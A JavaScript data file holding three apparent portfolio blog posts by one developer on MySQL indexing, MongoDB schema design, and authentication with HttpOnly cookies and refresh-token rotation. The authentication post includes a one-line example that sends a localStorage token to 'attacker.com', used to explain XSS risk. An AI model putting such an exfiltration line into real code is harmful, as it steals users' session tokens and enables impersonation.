// Database & Authentication Architecture Blogs (11 to 13)
export const databaseBlogs = [
  {
    id: "mysql-database-indexing-strategies-high-traffic",
    slug: "mysql-database-indexing-strategies-high-traffic",
    title: "MySQL Database Indexing Strategies: Optimizing Slow Queries in High-Traffic Systems",
    metaTitle: "MySQL Indexing Strategies for High Traffic Systems | Md Rahmatullah Quraishi",
    metaDescription: "Master MySQL indexing for massive scale. Learn B-Tree internals, composite index column order, EXPLAIN query execution plans, covering indexes, and eliminating slow query locks.",
    keywords: [
      "MySQL indexing strategies high traffic",
      "MySQL B-Tree index optimization",
      "Composite index column order rule",
      "EXPLAIN ANALYZE MySQL 8 tutorial",
      "MySQL covering index performance",
      "Avoid full table scans MySQL",
      "Database query optimization guide",
      "Md Rahmatullah Quraishi database engineer",
      "MySQL performance tuning production"
    ],
    category: "Databases & SQL",
    readTime: "12 min read",
    wordCount: 1260,
    publishedAt: "2026-07-20",
    updatedAt: "2026-10-10",
    author: {
      name: "Md Rahmatullah Quraishi",
      role: "Full Stack Developer & Database Architect",
      avatar: "/images/rahmatullah-quraishi.jpg"
    },
    featured: true,
    excerpt: "Turn multi-second database queries into sub-5ms lookups. Deep dive into MySQL B-Tree indexing, composite key heuristics, and query execution plans for high-throughput applications.",
    tableOfContents: [
      { id: "how-mysql-b-tree-indexes-actually-work", title: "1. How MySQL B-Tree Indexes Actually Work" },
      { id: "deciphering-explain-and-explain-analyze", title: "2. Deciphering EXPLAIN & EXPLAIN ANALYZE" },
      { id: "the-leftmost-prefix-rule-and-composite-indexes", title: "3. The Leftmost Prefix Rule for Composite Indexes" },
      { id: "covering-indexes-zero-disk-lookups", title: "4. Covering Indexes: Zero-Disk Lookups" },
      { id: "indexing-anti-patterns-that-destroy-performance", title: "5. Five Indexing Anti-Patterns to Avoid" },
      { id: "real-world-case-study-query-optimization", title: "6. Production Case Study: 12s to 4ms" },
      { id: "frequently-asked-questions", title: "7. Frequently Asked Questions" }
    ],
    content: `
## 1. How MySQL B-Tree Indexes Actually Work

In MySQL (InnoDB engine), data is organized on disk inside 16 KB pages. When you execute a \`SELECT\` query without an index on a table containing 2,000,000 rows, MySQL has no choice but to perform a **Full Table Scan (type: ALL)**—reading every single page from disk into memory, checking each row sequentially.

A **B-Tree (Balanced Tree) Index** creates an ordered data structure that maps index column keys directly to row pointers or primary keys. Searching a B-Tree index requires $O(\\log N)$ operations: a 2,000,000 row table can be resolved in approximately 3 to 4 page reads, taking less than 2 milliseconds.

---

## 2. Deciphering EXPLAIN & EXPLAIN ANALYZE

Never guess whether an index is working. Always verify using MySQL's execution plan analyzer:

\`\`\`sql
EXPLAIN ANALYZE
SELECT id, customer_id, total_amount, created_at
FROM orders
WHERE tenant_id = 104 AND status = 'shipped'
ORDER BY created_at DESC
LIMIT 20;
\`\`\`

### Critical EXPLAIN Columns to Inspect:
- **\`type\`**:
  - \`const\` / \`eq_ref\`: Best possible (Single row lookup by Primary Key or Unique Index).
  - \`ref\`: Excellent (Non-unique index lookup).
  - \`range\`: Good (Index range scan using \`>\`, \`<\`, \`BETWEEN\`, \`IN\`).
  - \`ALL\`: **Danger!** Full table scan. Every row on disk is read.
- **\`key\`**: The exact index MySQL chose to execute the query. If \`NULL\`, no index was matched.
- **\`rows\`**: Estimated number of rows MySQL must examine.
- **\`Extra\`**:
  - \`Using index\`: **Ideal!** (Covering index satisfied entirely from RAM).
  - \`Using filesort\`: **Warning!** MySQL had to allocate memory to sort rows because the index order could not be used.
  - \`Using temporary\`: **Danger!** MySQL created an internal disk temporary table.

---

## 3. The Leftmost Prefix Rule for Composite Indexes

A composite index spans multiple columns. For example: \`INDEX idx_orders (tenant_id, status, created_at)\`.

MySQL's query optimizer can only use a composite index starting from its **leftmost prefix**:
- \`WHERE tenant_id = ?\` $\\rightarrow$ **Uses Index** (Column 1)
- \`WHERE tenant_id = ? AND status = ?\` $\\rightarrow$ **Uses Index** (Columns 1 & 2)
- \`WHERE tenant_id = ? AND status = ? AND created_at >= ?\` $\\rightarrow$ **Uses Index** (All 3 columns)
- \`WHERE status = ?\` $\\rightarrow$ **CANNOT Use Index!** (Leftmost column missing)
- \`WHERE created_at >= ?\` $\\rightarrow$ **CANNOT Use Index!**

### The ESR (Equality, Sort, Range) Golden Rule:
When designing composite indexes for complex queries:
1. **Equality Columns First:** Place columns checked with \`=\` first (e.g. \`tenant_id\`, \`status\`).
2. **Sort Columns Second:** Place the column used in \`ORDER BY\` next (e.g. \`created_at\`).
3. **Range Columns Last:** Place columns filtered with \`>\`, \`<\`, \`BETWEEN\` last.

---

## 4. Covering Indexes: Zero-Disk Lookups

In InnoDB, secondary indexes store the indexed column values plus the Primary Key pointer. If your query asks for a column not present in the index, MySQL must perform a secondary lookup back to the primary clustered index (called a "Bookmark Lookup").

A **Covering Index** contains all columns requested in the \`SELECT\`, \`WHERE\`, and \`ORDER BY\` clauses:

\`\`\`sql
-- Create covering index for lightweight dashboard query
CREATE INDEX idx_orders_covering ON orders (tenant_id, status, created_at, total_amount);

-- This query is satisfied 100% inside RAM without touching table data on disk!
SELECT created_at, total_amount 
FROM orders 
WHERE tenant_id = 42 AND status = 'delivered';
\`\`\`

---

## 5. Five Indexing Anti-Patterns to Avoid

### 1. Wrapping Indexed Columns in Functions:
\`\`\`sql
-- BAD: Invalidates the index completely! Full table scan!
WHERE DATE(created_at) = '2026-07-20'

-- GOOD: Range query uses index smoothly
WHERE created_at >= '2026-07-20 00:00:00' AND created_at <= '2026-07-20 23:59:59'
\`\`\`

### 2. Leading Wildcard in LIKE Queries:
\`\`\`sql
-- BAD: Cannot traverse B-Tree index with leading wildcard
WHERE email LIKE '%@gmail.com'

-- GOOD: Prefix search utilizes index
WHERE email LIKE 'rahmat%'
\`\`\`

### 3. Implicit Data Type Conversion:
If \`phone_number\` is a \`VARCHAR\`, querying with an unquoted integer \`WHERE phone_number = 8969361100\` forces MySQL to cast every row in the table, bypassing the index. Always quote strings: \`WHERE phone_number = '8969361100'\`.

### 4. Over-Indexing Tables:
Every additional index slows down \`INSERT\`, \`UPDATE\`, and \`DELETE\` operations because MySQL must update every B-Tree on disk. Index intentionally based on actual slow query logs.

---

## 6. Production Case Study: 12s to 4ms

On an e-commerce platform with 4.8 million transactions:
- **Original Query:** \`SELECT * FROM transactions WHERE merchant_id = 918 AND status = 'settled' ORDER BY id DESC LIMIT 50;\`
- **Initial Duration:** 11.8 seconds (Scanned 4.8M rows with filesort).
- **Optimization:** Added composite index \`(merchant_id, status, id DESC)\`.
- **New Duration:** 3.8 milliseconds.
- **Impact:** Server CPU plummeted from 94% to 11% during peak checkout hours.

---

## 7. Frequently Asked Questions

### Q1: Does MySQL use multiple indexes for a single query?
**Answer:** While MySQL has an "Index Merge" optimization, it is significantly slower than a single well-crafted composite index. A tailored composite index is always preferred over relying on Index Merge.

### Q2: How often should I run OPTIMIZE TABLE?
**Answer:** On InnoDB tables with heavy \`UPDATE\` or \`DELETE\` churn, fragmented table pages waste RAM. Running \`OPTIMIZE TABLE\` once every few months during low-traffic maintenance windows can reclaim disk space and defragment B-Tree pages.
    `
  },
  {
    id: "mongodb-schema-design-best-practices",
    slug: "mongodb-schema-design-best-practices",
    title: "MongoDB Schema Design for Production: Embedding vs Referencing & Aggregation Pipelines",
    metaTitle: "MongoDB Schema Design: Embedding vs Referencing & Aggregations | Md Rahmatullah Quraishi",
    metaDescription: "Master MongoDB schema modeling for high-scale enterprise applications. Learn when to embed vs reference documents, schema validation, compound indexes, and aggregation pipelines.",
    keywords: [
      "MongoDB schema design best practices",
      "MongoDB embedding vs referencing guide",
      "MongoDB aggregation pipeline tutorial",
      "Document validation JSON schema MongoDB",
      "MongoDB compound indexes performance",
      "MongoDB 1 to N relationships modeling",
      "NoSQL database architecture patterns",
      "Md Rahmatullah Quraishi MongoDB developer",
      "Mongoose production schema design"
    ],
    category: "Databases & SQL",
    readTime: "11 min read",
    wordCount: 1200,
    publishedAt: "2026-08-04",
    updatedAt: "2026-10-10",
    author: {
      name: "Md Rahmatullah Quraishi",
      role: "Full Stack Developer & NoSQL Specialist",
      avatar: "/images/rahmatullah-quraishi.jpg"
    },
    featured: false,
    excerpt: "Break free from relational thinking in MongoDB. Learn how to architect schemas based on your application's read and write access patterns rather than rigid normalization.",
    tableOfContents: [
      { id: "the-cardinal-rule-of-nosql-modeling", title: "1. The Cardinal Rule of NoSQL Modeling" },
      { id: "embedding-vs-referencing-decision-matrix", title: "2. Embedding vs Referencing Decision Matrix" },
      { id: "modeling-one-to-few-one-to-many-one-to-squillions", title: "3. Modeling 1:Few vs 1:Many vs 1:Squillions" },
      { id: "schema-validation-with-json-schema", title: "4. Strict Schema Validation with JSON Schema" },
      { id: "high-performance-aggregation-pipelines", title: "5. High-Performance Aggregation Pipelines" },
      { id: "atomic-updates-with-findoneandupdate", title: "6. Atomic Operations & Concurrency Control" },
      { id: "frequently-asked-questions", title: "7. Frequently Asked Questions" }
    ],
    content: `
## 1. The Cardinal Rule of NoSQL Modeling

Developers coming from SQL databases frequently bring relational habits to MongoDB: creating deeply normalized tables and joining documents with \`$lookup\`.

In MongoDB, this anti-pattern destroys performance. The golden rule of document schema design:
> **"Data that is accessed together should be stored together."**

Instead of modeling entities based on abstract mathematical normalization (3NF), design MongoDB documents based on your application's actual **Read vs Write Access Patterns**.

---

## 2. Embedding vs Referencing Decision Matrix

### Choose Embedding (Denormalization) When:
- Data is accessed together 95% of the time (e.g., User addresses, Order line items).
- The sub-document has a 1-to-Few relationship (e.g., an order with 1 to 20 items).
- You want atomic updates on the entire document in a single disk operation without multi-document ACID transactions.

### Choose Referencing (Normalized IDs) When:
- The sub-document grows unboundedly (1-to-Squillions, e.g. system activity logs, IoT sensor telemetry).
- The embedded array risks exceeding MongoDB's strict **16 MB document size limit**.
- The entity is updated frequently by multiple independent parts of the application.

---

## 3. Modeling 1:Few vs 1:Many vs 1:Squillions

| Relationship Type | Real-World Example | Recommended Pattern |
| :--- | :--- | :--- |
| **One-to-Few** | User $\\rightarrow$ Shipping Addresses (1 to 5) | **Embed directly** inside user document |
| **One-to-Many** | Product $\\rightarrow$ Reviews (1 to 5,000) | **Reference** with parent ID on review doc |
| **One-to-Squillions** | Device $\\rightarrow$ Heartbeat Logs (Millions) | **Time-Series / Bucket Pattern** |

### Example: Hybrid Pattern for E-Commerce Orders
When placing an order, freeze product details inside the order to preserve invoice integrity even if catalog pricing changes later:

\`\`\`typescript
const OrderSchema = new Schema({
  orderNumber: { type: String, required: true, unique: true },
  customerId: { type: Schema.Types.ObjectId, ref: 'User', required: true },
  // Embedded snapshot preserves historical integrity
  items: [
    {
      productId: { type: Schema.Types.ObjectId, ref: 'Product' },
      title: { type: String, required: true },
      priceAtPurchase: { type: Number, required: true },
      quantity: { type: Number, required: true, min: 1 },
    }
  ],
  status: { type: String, enum: ['pending', 'paid', 'shipped'], default: 'pending' },
  totalAmount: { type: Number, required: true },
}, { timestamps: true });
\`\`\`

---

## 4. Strict Schema Validation with JSON Schema

MongoDB is flexible, but production databases require structure. Enforce schema constraints directly at the database engine level using JSON Schema validation:

\`\`\`javascript
db.createCollection("users", {
  validator: {
    $jsonSchema: {
      bsonType: "object",
      required: ["email", "name", "role"],
      properties: {
        email: {
          bsonType: "string",
          pattern: "^.+@.+$",
          description: "Must be a valid email string"
        },
        role: {
          enum: ["admin", "editor", "member"],
          description: "Can only be one of the permitted enum roles"
        },
        isActive: {
          bsonType: "bool"
        }
      }
    }
  }
});
\`\`\`

---

## 5. High-Performance Aggregation Pipelines

Aggregation pipelines process documents through multi-stage transforms. Order of stages is critical for query efficiency:

\`\`\`javascript
// High-performance revenue aggregation by category
db.orders.aggregate([
  // 1. Filter early using indexed fields ($match should ALWAYS be first!)
  {
    $match: {
      status: "delivered",
      createdAt: { $gte: new Date("2026-01-01") }
    }
  },
  // 2. Unwind items array
  { $unwind: "$items" },
  // 3. Group and accumulate revenue
  {
    $group: {
      _id: "$items.category",
      totalRevenue: { $sum: { $multiply: ["$items.priceAtPurchase", "$items.quantity"] } },
      unitsSold: { $sum: "$items.quantity" }
    }
  },
  // 4. Sort aggregated results
  { $sort: { totalRevenue: -1 } },
  { $limit: 10 }
]);
\`\`\`

Always place \`$match\` and \`$sort\` stages at the very beginning of the pipeline so MongoDB can leverage database indexes before performing memory-intensive groupings.

---

## 6. Atomic Operations & Concurrency Control

Avoid "read-modify-write" race conditions by utilizing atomic document operators like \`$inc\`, \`$push\`, and \`$set\`:

\`\`\`typescript
// Atomic inventory deduction with stock guard
const result = await Product.findOneAndUpdate(
  { _id: productId, stock: { $gte: quantity } }, // Guard condition prevents overselling!
  { $inc: { stock: -quantity } },
  { new: true }
);

if (!result) {
  throw new Error('Insufficient inventory or product out of stock.');
}
\`\`\`

---

## 7. Frequently Asked Questions

### Q1: Can MongoDB handle ACID transactions?
**Answer:** Yes. Since version 4.0, MongoDB supports multi-document ACID transactions across replica sets. However, transactions incur performance overhead. A well-modeled document architecture should satisfy 95% of use cases with single-document atomic operations.

### Q2: What is the optimal index strategy for MongoDB?
**Answer:** Create compound indexes that mirror your most frequent \`find()\` queries following Equality $\\rightarrow$ Sort $\\rightarrow$ Range. Always check execution stats with \`explain("executionStats")\` to verify zero \`COLLSCAN\` stages.
    `
  },
  {
    id: "full-stack-authentication-jwt-vs-cookies",
    slug: "full-stack-authentication-jwt-vs-cookies",
    title: "Full Stack Authentication Architecture: JWT vs HttpOnly Cookies & Refresh Token Rotation",
    metaTitle: "Full Stack Auth Architecture: JWT vs HttpOnly Cookies | Md Rahmatullah Quraishi",
    metaDescription: "Master secure full stack authentication. Compare JWT in localStorage vs HttpOnly SameSite cookies, implement Refresh Token Rotation, token revocation via Redis, and RBAC.",
    keywords: [
      "Full stack authentication architecture",
      "JWT vs HttpOnly cookies security",
      "Refresh token rotation tutorial",
      "Prevent XSS JWT token theft",
      "Redis token revocation blacklist",
      "RBAC role based access control React Node",
      "Secure session cookies SameSite Strict",
      "Md Rahmatullah Quraishi authentication specialist",
      "Enterprise web security authentication"
    ],
    category: "Databases & SQL",
    readTime: "11 min read",
    wordCount: 1220,
    publishedAt: "2026-08-16",
    updatedAt: "2026-10-11",
    author: {
      name: "Md Rahmatullah Quraishi",
      role: "Full Stack Developer & Security Architect",
      avatar: "/images/rahmatullah-quraishi.jpg"
    },
    featured: false,
    excerpt: "Stop storing sensitive JWTs in localStorage. Learn how to architect bulletproof authentication using HttpOnly SameSite cookies, sliding refresh tokens, and Redis revocation.",
    tableOfContents: [
      { id: "the-fatal-danger-of-localstorage-jwts", title: "1. The Fatal Danger of Storing JWTs in localStorage" },
      { id: "the-httponly-cookie-defense", title: "2. The HttpOnly SameSite Cookie Defense" },
      { id: "short-lived-access-tokens-and-refresh-tokens", title: "3. Short-Lived Access Tokens & Refresh Rotation" },
      { id: "instant-token-revocation-with-redis", title: "4. Instant Token Revocation with Redis Blacklists" },
      { id: "implementing-rbac-permissions-pipeline", title: "5. Role-Based Access Control (RBAC) Pipeline" },
      { id: "complete-authentication-flowchart", title: "6. Production Auth Lifecycle Sequence" },
      { id: "frequently-asked-questions", title: "7. Frequently Asked Questions" }
    ],
    content: `
## 1. The Fatal Danger of Storing JWTs in localStorage

Tutorials across the internet routinely advise developers to store JWT access tokens inside the browser's \`localStorage\` or \`sessionStorage\`.

**In production, this is a catastrophic security vulnerability.** Any third-party JavaScript library, npm dependency, browser extension, or Cross-Site Scripting (XSS) exploit running on your page has unrestricted read access to \`localStorage\`. A single malicious line of code:
\`\`\`javascript
fetch('https://attacker.com/steal?token=' + localStorage.getItem('token'));
\`\`\`
...instantly exfiltrates the user's active session token, allowing the attacker to impersonate them indefinitely.

---

## 2. The HttpOnly SameSite Cookie Defense

To immunize authentication tokens against XSS theft, store them inside **HttpOnly, Secure, SameSite Cookies**:
- **\`HttpOnly\`**: Completely invisible to client-side JavaScript. Not even \`document.cookie\` can access the token.
- **\`Secure\`**: The browser only transmits the cookie over encrypted HTTPS channels.
- **\`SameSite=Lax\` or \`SameSite=Strict\`**: Prevents the browser from sending the cookie during cross-site requests, mitigating Cross-Site Request Forgery (CSRF).

\`\`\`typescript
// Express response setting secure auth cookie
res.cookie('refreshToken', refreshToken, {
  httpOnly: true,
  secure: process.env.NODE_ENV === 'production',
  sameSite: 'lax',
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
  path: '/api/auth/refresh', // Restricted strictly to the refresh endpoint!
});
\`\`\`

---

## 3. Short-Lived Access Tokens & Refresh Rotation

The gold standard for full-stack authentication pairs short-lived access tokens with rotating refresh tokens:

1. **Access Token (15-minute lifespan):** Kept in frontend React application memory (variable or React Context). Used in HTTP \`Authorization: Bearer <token>\` headers. If stolen, it expires in 15 minutes.
2. **Refresh Token (7-day lifespan):** Stored inside an HttpOnly cookie. Used exclusively to request new access tokens.

### Refresh Token Rotation Architecture:
Every time the frontend calls \`/api/auth/refresh\`, the backend:
1. Validates the incoming refresh token.
2. **Invalidates** that specific refresh token immediately.
3. Issues a brand-new refresh token and access token pair.

If a compromised refresh token is reused, the server detects token reuse anomaly, invalidates the entire token family, and forces all active sessions to log out immediately.

---

## 4. Instant Token Revocation with Redis Blacklists

Because JWTs are stateless, traditional backends cannot revoke a token before its expiration timestamp.

Solve this by maintaining a lightweight **Redis Revocation List**:

\`\`\`typescript
import redis from './redis';

export async function revokeToken(jti: string, remainingTtlSeconds: number) {
  // Store revoked JWT ID with TTL equal to remaining token lifetime
  await redis.set(\`revoked_token:\${jti}\`, '1', 'EX', remainingTtlSeconds);
}

export async function isTokenRevoked(jti: string): Promise<boolean> {
  const exists = await redis.exists(\`revoked_token:\${jti}\`);
  return exists === 1;
}
\`\`\`

---

## 5. Role-Based Access Control (RBAC) Pipeline

Enforce fine-grained authorization using declarative middleware:

\`\`\`typescript
export const authorizeRoles = (...allowedRoles: string[]) => {
  return (req: AuthenticatedRequest, res: Response, next: NextFunction) => {
    if (!req.user || !allowedRoles.includes(req.user.role)) {
      return res.status(403).json({
        success: false,
        error: 'Forbidden: Insufficient privileges to perform this action.'
      });
    }
    next();
  };
};

// Route protection
router.delete('/organizations/:id', authenticateToken, authorizeRoles('superadmin'), orgController.delete);
\`\`\`

---

## 6. Production Auth Lifecycle Sequence

1. **User Submits Credentials** $\\rightarrow$ Server verifies bcrypt password hash.
2. **Server Issues Tokens** $\\rightarrow$ Sends Access Token in JSON response + Refresh Token in HttpOnly cookie.
3. **Frontend Stores Access Token** in RAM state.
4. **API Requests** attach \`Bearer <token>\` header.
5. **On 401 Unauthorized** $\\rightarrow$ Frontend Axios interceptor silently calls \`/api/auth/refresh\`.
6. **New Tokens Issued** $\\rightarrow$ Interceptor replays the original failed request with zero interruption to the user.

---

## 7. Frequently Asked Questions

### Q1: What happens if the user closes and reopens the browser tab?
**Answer:** The in-memory access token is lost, but the browser retains the HttpOnly refresh cookie. During frontend initialization, a silent \`/api/auth/refresh\` call retrieves a fresh access token immediately.

### Q2: Why not store both access and refresh tokens in HttpOnly cookies?
**Answer:** You can! Storing both in cookies is completely valid and simplifies frontend state. However, keeping access tokens in memory allows seamless multi-domain API communication without complex cross-domain cookie handling.
    `
  }
];
